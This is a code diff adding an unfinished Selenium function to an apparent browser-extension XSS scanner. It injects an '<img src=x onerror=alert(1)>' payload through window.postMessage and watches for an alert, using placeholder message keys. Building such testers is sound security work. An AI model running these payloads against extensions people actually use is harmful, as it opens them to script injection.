@@ -4819,6 +4819,64 @@ def chromeDebugger_favIconUrl_N(args_tuple):
 
     return logs
 
+# 7) window.addEventListerner.message
+def windowAddEventListenerMessage(driver, ext_id, url_path, payloads):
+    # PAYLOAD: 
+    # postMessage({ message: "<img src=x onerror=alert(1)>" }, "*")
+    
+    # get xss test website
+    driver.get('file:////home/showloser/localhost/dynamic/test.html')
+    # set handler for example.com
+    example = driver.current_window_handle
+
+    # get extension popup.html
+    driver.switch_to.new_window('tab')
+    extension = driver.current_window_handle
+    driver.get(url_path)
+
+    # pre-configure
+    buttons = driver.find_elements(By.TAG_NAME,"button")
+    for button in buttons:
+        button.click()
+
+
+
+    # implement tommorow 
+
+    regex_results = ['data', 'log', 'cocksuker123', '123skd', 'message']
+    # regex_results = []
+
+    xss_payload = '<img src=x onerror=alert(1)>'
+
+    driver.switch_to.window(example)
+
+    # check if regex scan found anything
+    # if regex able to find scan results, send payload as json object
+    if len(regex_results) > 0:
+        object_payload = {key: xss_payload for key in regex_results}
+        driver.execute_script(f"window.postMessage({object_payload},'*')")
+
+        try:
+            # wait 2 seconds to see if alert is detected
+            WebDriverWait(driver, 2).until(EC.alert_is_present())
+            alert = driver.switch_to.alert
+            alert.accept()
+            print('+ Alert Detected +')
+        except TimeoutException:
+            print('= No alerts detected =')
+
+    # else, send payload as string
+    else:
+        driver.execute_script(f"window.postMessage(`{xss_payload}`,'*')")
+
+        try:
+            # wait 2 seconds to see if alert is detected
+            WebDriverWait(driver, 2).until(EC.alert_is_present())
+            alert = driver.switch_to.alert
+            alert.accept()
+            print('+ Alert Detected +')
+        except TimeoutException:
+            print('= No alerts detected =')
 
 # to do/test)
 # 1) windowAddEventListernerMessage(test this shit)
